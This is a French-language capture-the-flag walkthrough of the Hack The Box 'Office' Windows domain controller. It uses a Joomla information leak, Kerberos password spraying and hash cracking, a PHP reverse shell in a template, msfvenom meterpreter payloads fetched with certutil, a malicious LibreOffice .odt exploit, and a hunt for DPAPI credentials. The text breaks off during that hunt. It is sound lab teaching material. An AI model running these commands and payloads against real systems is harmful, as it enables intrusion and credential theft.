<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Office</title>
<meta name=description content="Platforme: Hack The Box Lien: Office Niveau: Difficile OS: Windows Office est un Windows Server 2022 fonctionnant en tant que contrôleur de domaine. Le site web …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-office/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Office"><meta property="og:description" content="Platforme: Hack The Box Lien: Office Niveau: Difficile OS: Windows Office est un Windows Server 2022 fonctionnant en tant que contrôleur de domaine. Le site web …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Office/Office.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Office/Office.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Office"><meta name=twitter:description content="Platforme: Hack The Box Lien: Office Niveau: Difficile OS: Windows Office est un Windows Server 2022 fonctionnant en tant que contrôleur de domaine. Le site web …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-office/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-office/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Office/Office.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-office/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-office/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Office</h1><small role=doc-subtitle></small><p class=post-date>12 min read |
<span class=post-date>19 Juin 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Office>Office</a></li><li>Niveau: Difficile</li><li>OS: Windows</li></ul><hr><p>Office est un Windows Server 2022 fonctionnant en tant que contrôleur de domaine. Le site web hébergé sur le serveur utilise une version obsolète de Joomla, qui est vulnérable au <code>CVE-2023-23752</code>. En exploitant cette vulnérabilité, nous révélons le mot de passe de la base de données MySQL. Après énumération, nous trouvons un nom d&rsquo;utilisateur valide pour le mot de passe, ce qui nous permet d&rsquo;accéder à un dossier partagé contenant un fichier pcap.</p><p>Nous examinons le fichier pcap avec Wireshark, et découvrons une trame <code>AS-REQ</code> contenant toutes les informations nécessaires pour reconstruire un hash. En utilisant hashcat, nous récupérons un mot de passe qui nous permet d&rsquo;accéder au tableau de bord de Joomla. En insérant un reverse shell PHP dans un template Joomla, nous obtenons notre accès initial. À partir de ce premier shell, nous nous déplaçons latéralement vers un autre utilisateur et récupérons le fichier <code>user.txt</code>.</p><p>Avec l&rsquo;aide de Bloodhound, nous apprenons que l&rsquo;un des utilisateurs a la permission <code>CanPSRemote</code> et est également membre du groupe <code>GPO Managers</code>. Nous réalisons un autre mouvement latéral en exploitant une version obsolète de LibreOffice via le <code>CVE-2023-2255</code>, en téléchargeant un fichier <code>.odt</code> malveillant sur un site web interne. Notre dernier mouvement latéral est accompli en décryptant certains fichiers d&rsquo;identification DPAPI avec Mimikatz, ce qui permet d&rsquo;obtenir le mot de passe de l&rsquo;utilisateur ayant les permissions laxistes. Enfin, nous exploitons la mauvaise configuration du serveur en ajoutant l&rsquo;utilisateur au groupe Administrators, ce qui nous permet de lire le fichier <code>root.txt</code>.</p><p>Addresse IP cible - <code>10.10.11.3</code></p><h2 id=balayage>Balayage</h2><p>Un script bash est utilisé pour le balayage, vous pouvez le trouver <a href=https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh>ici</a>.</p><pre tabindex=0><code>./nmap_scan.sh 10.10.11.3 Office
</code></pre><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49668,51552,51567,51587,51639
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-06-20 00:30 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> office.htb <span style=color:#56b6c2>(</span>10.10.11.3<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.066s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>80/tcp    open  http          Apache httpd 2.4.56 <span style=color:#56b6c2>((</span>Win64<span style=color:#56b6c2>)</span> OpenSSL/1.1.1t PHP/8.0.28<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| http-robots.txt: <span style=color:#d19a66>16</span> disallowed entries <span style=color:#56b6c2>(</span><span style=color:#d19a66>15</span> shown<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| /joomla/administrator/ /administrator/ /api/ /bin/ 
</span></span><span style=display:flex><span>| /cache/ /cli/ /components/ /includes/ /installation/ 
</span></span><span style=display:flex><span>|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.56 <span style=color:#56b6c2>(</span>Win64<span style=color:#56b6c2>)</span> OpenSSL/1.1.1t PHP/8.0.28
</span></span><span style=display:flex><span>|_http-generator: Joomla! - Open Source Content Management
</span></span><span style=display:flex><span>|_http-title: Home
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-06-20 13:30:27Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC.office.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style=display:flex><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style=display:flex><span>443/tcp   open  ssl/http      Apache httpd 2.4.56 <span style=color:#56b6c2>(</span>OpenSSL/1.1.1t PHP/8.0.28<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: <span style=color:#d19a66>403</span> Forbidden
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.56 <span style=color:#56b6c2>(</span>Win64<span style=color:#56b6c2>)</span> OpenSSL/1.1.1t PHP/8.0.28
</span></span><span style=display:flex><span>| tls-alpn: 
</span></span><span style=display:flex><span>|_  http/1.1
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>localhost
</span></span><span style=display:flex><span>| Not valid before: 2009-11-10T23:48:47
</span></span><span style=display:flex><span>|_Not valid after:  2019-11-08T23:48:47
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC.office.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style=display:flex><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC.office.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style=display:flex><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style=display:flex><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style=display:flex><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC.office.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-05-10T12:36:58
</span></span><span style=display:flex><span>|_Not valid after:  2024-05-09T12:36:58
</span></span><span style=display:flex><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style=display:flex><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>51552/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>51567/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>51587/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>51639/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-06-20T13:31:17
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>|_clock-skew: mean: 7h59m42s, deviation: 0s, median: 7h59m41s
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 99.29 seconds
</span></span></code></pre></div><p>Le scan nmap révèle un contrôleur de domaine nommé <code>office.htb</code> que nous ajoutons au fichier <code>/etc/hosts</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.3 office.htb dc.office.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>En visitant <code>http://office.htb/</code> nous trouvons un blog sur les armures d&rsquo;Iron Man.</p><p><img src=/images/HTB-Office/office-blog.png alt="Office blog website"></p><p>Grâce à wappalyzer, nous découvrons que le site utilise Joomla.</p><p><img src=/images/HTB-Office/wappalyzer.png alt="Office - Wappalyzer results"></p><p>Nous avons un fichier <code>robots.txt</code> dans les résultats de nmap.</p><p><img src=/images/HTB-Office/robots-txt.png alt="Office - robots.txt"></p><p>Plusieurs répertoires sont découverts.</p><p><img src=/images/HTB-Office/endpoints-found.png alt="robots.txt directories"></p><p><code>http://office.htb/administrator/</code> nous conduit à la page de connexion de l&rsquo;administrateur; cependant, nous n&rsquo;avons pas d&rsquo;identifiants.</p><p><img src=/images/HTB-Office/Joomla-admin-login.png alt="Joomla admin panel"></p><p>Sur <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version>cette</a> page HackTricks, nous apprenons quelques techniques pour obtenir la version de Joomla et nous l&rsquo;obtenons en allant à <code>http://office.htb//administrator/manifests/files/joomla.xml</code>.</p><p><img src=/images/HTB-Office/Joomla-version.png alt="Joomla version"></p><p>Pour cette version, nous trouvons le <a href=https://vulncheck.com/blog/joomla-for-rce>CVE-2023-23752</a> qui est une vulnérabilité de fuite d&rsquo;information. Un PoC est disponible <a href=https://github.com/0xNahim/CVE-2023-23752>ici</a>.</p><p>Après avoir exécuté <code>python3 exploit.py -u http://office.htb</code>, nous obtenons le mot de passe root pour MySQL <code>H0lOgrams4reTakIng0Ver754!</code>.</p><p><img src=/images/HTB-Office/joomla-creds.png alt="DB password recovered"></p><p>Notre tentative de connexion avec <code>administrator:H0lOgrams4reTakIng0Ver754!</code> échoue, nous devons donc trouver un autre moyen d&rsquo;utiliser ce mot de passe. Nous savons grâce aux résultats du scan nmap que Kerberos fonctionne sur le port 88, utilisons <a href=https://github.com/ropnop/kerbrute>kerbrute</a> pour énumérer les comptes valides.</p><pre tabindex=0><code>kerbrute userenum --dc office.htb -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
</code></pre><p><img src=/images/HTB-Office/valid-users.png alt="Valid usernames found with Kerbrute"></p><p>Avec la liste des utilisateurs valides, nous essayons maintenant de trouver une combinaison valide.</p><pre tabindex=0><code>kerbrute passwordspray --dc office.htb -d office.htb usernames &#39;H0lOgrams4reTakIng0Ver754!&#39;
</code></pre><p><img src=/images/HTB-Office/login-sucess.png alt="Valid credential pair"></p><p>Nous constatons que <code>dwolfe@office.htb:H0lOgrams4reTakIng0Ver754!</code> marche!</p><p>Avec impacket, nous nous connectons à smb et nous remarquons un partage appelé <code>SOC Analysis</code>, contenant un fichier pcap nommé <code>Latest-System-Dump-8fbc124d.pcap</code> que nous téléchargeons.</p><pre tabindex=0><code>impacket-smbclient dwolfe:&#39;H0lOgrams4reTakIng0Ver754!&#39;@10.10.11.3
</code></pre><p><img src=/images/HTB-Office/share-access.png alt="SMB login and SOC Analysis share"></p><p>Nous ouvrons le fichier pcap avec Wireshark et en filtrant pour <code>kerberos</code> nous découvrons des informations intéressantes.</p><p><img src=/images/HTB-Office/pcap.png alt="Kerberos pcap file"></p><blockquote><p>Lorsqu&rsquo;un utilisateur demande un ticket d&rsquo;octroi de ticket (TGT) au centre de distribution de clés (KDC), un processus appelé AS-REQ (Authentication Service Request) est utilisé. Dans le cadre de ce processus, l&rsquo;utilisateur doit prouver son identité au centre de distribution de clés. Pendant l&rsquo;AS-REQ, le client (l&rsquo;utilisateur) envoie un horodatage crypté avec son hachage NTLM (qui est dérivé de son mot de passe). Cela prouve qu&rsquo;il connaît le mot de passe sans l&rsquo;envoyer directement.</p></blockquote><p>Nous pouvons extraire le hachage du mot de passe du fichier pcap et utiliser hashcat pour le craquer. Étant donné que hashcat possède plusieurs modules pour les hachages Kerberos, nous devons utiliser le bon format. Passons en revue les informations dont nous disposons:</p><ul><li>La présence des champs <code>PA-DATA</code>, qui sont utilisés pour la pré-authentification, confirme que nous avons affaire à des paquets de pré-authentification Kerberos.</li><li>Le type de chiffrement (etype) est spécifié comme étant <code>18</code> et il utilise AES-256.</li><li>Nous avons le chiffre (hachage NTLM) utilisé pour crypter l&rsquo;horodatage.</li><li>Nous avons le nom d&rsquo;utilisateur (<code>CNameString = tstark</code>) et le nom de domaine (<code>realm = OFFICE.HTB</code>).</li></ul><p>Avec ces informations, nous trouvons que le hachage correspondant doit suivre le format <code>$krb5pa$18$user$realm$cipher</code>. Il correspond au module 19900 de hashcat que vous pouvez vérifier <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">ici</a>.</p><p>Nous utiliserons un script Bash pour obtenir le hachage.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span><span style=color:#e06c75>filter</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>tshark -r <span style=color:#e06c75>$1</span> -Y <span style=color:#98c379>&#34;kerberos.msg_type == 10 &amp;&amp; kerberos.cipher &amp;&amp; kerberos.realm &amp;&amp; kerberos.CNameString&#34;</span> -T fields -e kerberos.CNameString -e kerberos.realm -e kerberos.cipher -E <span style=color:#e06c75>separator</span><span style=color:#56b6c2>=</span>$ <span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> i in <span style=color:#c678dd>$(</span><span style=color:#e5c07b>echo</span> <span style=color:#e06c75>$filter</span> | tr <span style=color:#98c379>&#39; &#39;</span> <span style=color:#98c379>&#39;\n&#39;</span><span style=color:#c678dd>)</span> ; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;\$krb5pa\$18\$</span><span style=color:#e06c75>$i</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
</span></span></code></pre></div><p><img src=/images/HTB-Office/kerberos-hash.png alt="Kerberos hash found"></p><p>En utilisant hashcat, nous obtenons le mot de passe <code>playboy69</code>.</p><pre tabindex=0><code>hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-Office/hash-cracked.png alt="Kerberos hash cracked with hashcat"></p><h2 id=accès-initial>Accès Initial</h2><p>Avec les identifiants <code>administrator:playboy69</code> nous nous connectons au tableau de bord de Joomla, nous sommes connectés en tant que <code>Tony Stark</code>.</p><p><img src=/images/HTB-Office/joomla-dashboard.png alt="Joomla Dashboard"></p><p>Comme c&rsquo;est souvent le cas avec les logiciels CMS, il est possible de modifier les templates à l&rsquo;aide d&rsquo;un code personnalisé. Nous exploitons cette fonction pour obtenir un shell inversé. En allant dans <code>System</code> &ndash;> <code>Site Templates</code> &ndash;> cliquez sur <code>Cassiopeia Details and Files</code> &ndash;> remplacez <code>error.php</code> par un reverse shell PHP que vous pouvez trouver sur <a href=https://www.revshells.com/>revshells</a> &ndash;> Save and Close &ndash;> enfin visitez <code>http://office.htb/templates/cassiopeia/error.php</code> pour activer le reverse shell.</p><p>Sur le listener, nous obtenons un shell sous le nom de <code>web_account</code>.</p><p><img src=/images/HTB-Office/shell-office.png alt="Initial foothold, shell as web_account"></p><h3 id=shell-en-tant-que-tstark>Shell en tant que tstark</h3><p>Nous ne pouvons pas lire le fichier <code>user.txt</code> avec ce compte mais nous pouvons passer à l&rsquo;utilisateur <code>tstark</code>. Puisque nous avons déjà les identifiants corrects, nous pouvons utiliser <a href=https://github.com/antonioCoco/RunasCs>runascs</a> pour accéder au compte, nous utiliserons un shell meterpreter.</p><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP_ADDRESS&gt; LPORT=&lt;PORT_NUMBER&gt; -f exe -o payload.exe
</code></pre><p><img src=/images/HTB-Office/msfvenom-cmd.png alt="malicious file generated with msfvenom"></p><p>Après avoir envoyé les deux fichiers à la cible, nous configurons le handler dans Metasploit.</p><pre tabindex=0><code>certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/RunasCs.exe runascs.exe

certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/payload.exe payload.exe
</code></pre><pre tabindex=0><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost &lt;IP_ADDRESS&gt;
set lport &lt;PORT_NUMBERS&gt;
run
</code></pre><p>En exécutant RunasCs avec notre fichier malveillant, nous obtenons un shell meterpreter.</p><pre tabindex=0><code>runascs.exe tstark playboy69 payload.exe
</code></pre><p><img src=/images/HTB-Office/runascs-cmd.png alt="runascs command"></p><p><img src=/images/HTB-Office/tstark-meterpreter.png alt="tstark meterpreter shell"></p><p>Le fichier <code>user.txt</code> se trouve dans <code>C:\Users\tstark\Desktop</code>.</p><p><img src=/images/HTB-Office/user-flag-metasploit.png alt="user flag location"></p><p>De plus, nous remarquons la présence de deux utilisateurs supplémentaires sur le système (PPotts and HHogan).</p><p><img src=/images/HTB-Office/Users-list.png alt="users directory on target system"></p><h4 id=enumération-de-lactive-directory>Enumération de l&rsquo;Active Directory</h4><p>Sachant que nous avons affaire à un contrôleur de domaine, utilisons Bloodhound pour l&rsquo;énumérer.</p><p><img src=/images/HTB-Office/bloodhound-cmd.png alt="Bloodhound command"></p><pre tabindex=0><code>bloodhound-python -c all -u tstark -p &#39;playboy69&#39; -d office.htb -dc dc.office.htb -ns 10.10.11.3
</code></pre><p>Une fois la collecte de données terminée, nous pouvons lancer Bloodhound.</p><pre tabindex=0><code>sudo neo4j start

bloodhound --no-sandbox
</code></pre><p>Lorsque Bloodhound est lancé, nous utilisons le bouton &ldquo;Upload Data&rdquo; (télécharger les données) à droite.</p><p><img src=/images/HTB-Office/upload-data-bloodhound.png alt="Upload data in Bloodhound"></p><p>Sélectionnez ensuite tous les fichiers json créés par Bloodhound et les informations seront importées.</p><p><img src=/images/HTB-Office/bloodhound-files.png alt="Bloodhound json files"></p><p>Nous découvrons que l&rsquo;utilisateur <code>Hogan</code> a la permission <code>CanPSRemote</code> lui permettant d&rsquo;initier des sessions distantes sur la cible. Dans notre cas, <code>evil-winrm</code> peut être utilisé pour cette tâche.</p><p><img src=/images/HTB-Office/hhogan-canpsremote.png alt="hhogan CanPSRemote"></p><p>De plus, cet utilisateur est également membre du groupe <code>GPO Managers</code>, ce qui indique qu&rsquo;il a le droit de gérer des objets de stratégie de groupe (GPO).</p><p><img src=/images/HTB-Office/gpo-managers-membership.png alt="hhogan is a member of the GPO Managers group"></p><p>En exécutant <code>netstat</code> dans notre shell meterpreter, nous remarquons que <code>http</code> tourne sur le port <code>8083</code>, que nous n&rsquo;avons pas découvert avec nmap.</p><p><img src=/images/HTB-Office/netstat-cmd.png alt="netstat command"></p><p>Pour y accéder, nous utiliserons <a href=https://github.com/nicocha30/ligolo-ng>ligolo-ng</a>.</p><p>En allant sur <code>http://240.0.0.1:8083/</code>, nous trouvons un site web pour Holography Industries.</p><p><img src=/images/HTB-Office/business-website.png alt="Internal business website"></p><p>Cliquer sur <code>Submit Application</code> nous amène à <code>/resume.php</code>, une page où nous pouvons télécharger un CV pour une demande d&rsquo;emploi.</p><p><img src=/images/HTB-Office/resume-php.png alt="resume.php page for file submission"></p><p>La tentative de téléchargement d&rsquo;un fichier pdf échoue, et nous apprenons que cette application n&rsquo;accepte que les fichiers <code>Doc</code>, <code>Docx</code>, <code>Docm</code>, et <code>Odt</code>.</p><p><img src=/images/HTB-Office/files-extensions.png alt="file extensions acepted"></p><p>Les fichiers de cette application se trouvent dans <code>C:\xampp\htdocs\internal</code>.</p><p><img src=/images/HTB-Office/internal-files.png alt="Internal files"></p><h3 id=shell-en-tant-que-ppotts>Shell en tant que ppotts</h3><p>Le fichier <code>resume.php</code> appartient à l&rsquo;utilisateur <code>PPotts</code>.</p><p><img src=/images/HTB-Office/resume-php-permissions.png alt="resume.php file permissions"></p><p>Nous constatons également que la version 5.2 de Libre Office est installée sur la cible.</p><p><img src=/images/HTB-Office/Libre-Office-version.png alt="Libre Office version"></p><p>Cette version est obsolète et vulnérable au <a href=https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/>CVE-2023-2255</a> avec un PoC disponible <a href=https://github.com/elweth-sec/CVE-2023-2255>ici</a>.</p><p>Nous commençons par créer un fichier exe malveillant.</p><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.4 LPORT=5555 -f exe -o shell.exe
</code></pre><p>Nous créons ensuite un fichier odt malveillant.</p><pre tabindex=0><code>python3 CVE-2023-2255.py --cmd &#39;C:\Users\Public\shell.exe&#39; --output &#39;exploit.odt&#39;
</code></pre><p><img src=/images/HTB-Office/malicious-odt.png alt="Malicious odt file"></p><p>Quelques minutes après avoir placé <code>shell.exe</code> dans le répertoire de notre choix et téléchargé notre fichier <code>exploit.odt</code> via l&rsquo;application interne, nous obtenons un nouveau shell meterpreter sous le nom de <code>ppotts</code>.</p><p><img src=/images/HTB-Office/ppotts-shell.png alt="ppotts meterpreter shell"></p><h3 id=shell-en-tant-que-hhogan>Shell en tant que hhogan</h3><p>Nous utilisons <code>winpeas</code> pour énumérer le système cible et nous trouvons quelques fichiers d&rsquo;identification DPAPI.</p><blockquote><p>DPAPI, qui signifie Data Protection API, est un ensemble de services cryptographiques intégrés au système d&rsquo;exploitation Windows. Elle offre aux développeurs un moyen simple de protéger les données sensibles, telles que les mots de passe, les clés de chiffrement et d&rsquo;autres informations confidentielles, en chiffrant et en déchiffrant les données à l&rsquo;aide d&rsquo;algorithmes cryptographiques robustes.</p></blockquote><p><img src=/images/HTB-Office/DPAPI-Master-Keys.png alt="DPAPI master keys"></p><p><img src=/images/HTB-Office/DPAPI-Credential-Files.png alt="DPAPI credential files"></p><p>Avec <code>cmdkey /list</code>, nous constatons que les informations d&rsquo;identification de l&rsquo;utilisateur <code>hhogan</code> sont actuellement stockées sur la cible.</p><p><img src=/images/HTB-Office/cmdkey-cmd.png alt="cmdkey command"></p><p>Nous trouvons les fichiers d&rsquo;identification à l&rsquo;adresse spécifiée.</p><pre tabindex=0><code>Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\
</code></pre><p><img src=/images/HTB-Office/Credential-files.png alt="Credential files location"></p><p>Nous localisons également les clés principales.</p><pre tabindex=0><code>Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\
